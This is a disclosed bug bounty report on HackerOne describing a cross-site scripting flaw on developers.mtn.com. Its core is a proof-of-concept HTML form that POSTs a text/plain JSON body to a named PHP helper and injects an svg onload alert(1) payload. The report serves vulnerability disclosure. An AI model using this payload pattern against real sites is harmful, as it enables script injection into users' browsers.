# xss on [developers.mtn.com]

## Report Details
- **Report ID**: 924851
- **URL**: https://hackerone.com/reports/924851
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-07-15T21:28:33.488Z
- **Disclosed**: 2022-04-19T07:58:39.100Z

## Reporter
- **Username**: pisarenko
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
xss on 

`<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://developers.mtn.com/sites/all/themes/mtn/helpers/faq-helpful.php" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&quot;title&quot;&#58;&quot;Do&#32;you&#32;have&#32;sample&#32;or&#32;reference&#32;applications&#32;that&#32;could&#32;demonstrate&#32;some&#32;API&#32;calls&#32;for&#32;me&#63;&quot;&#44;&quot;helpful&quot;&#58;&quot;false&lt;svg&#32;onload" value="alert&#40;1&#41;&gt;&quot;&#125;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>`

{F908897}

## Impact

POC 
{F908895}

{F908896}

## Attachments
- vse.html
- 1.png
- 2.png
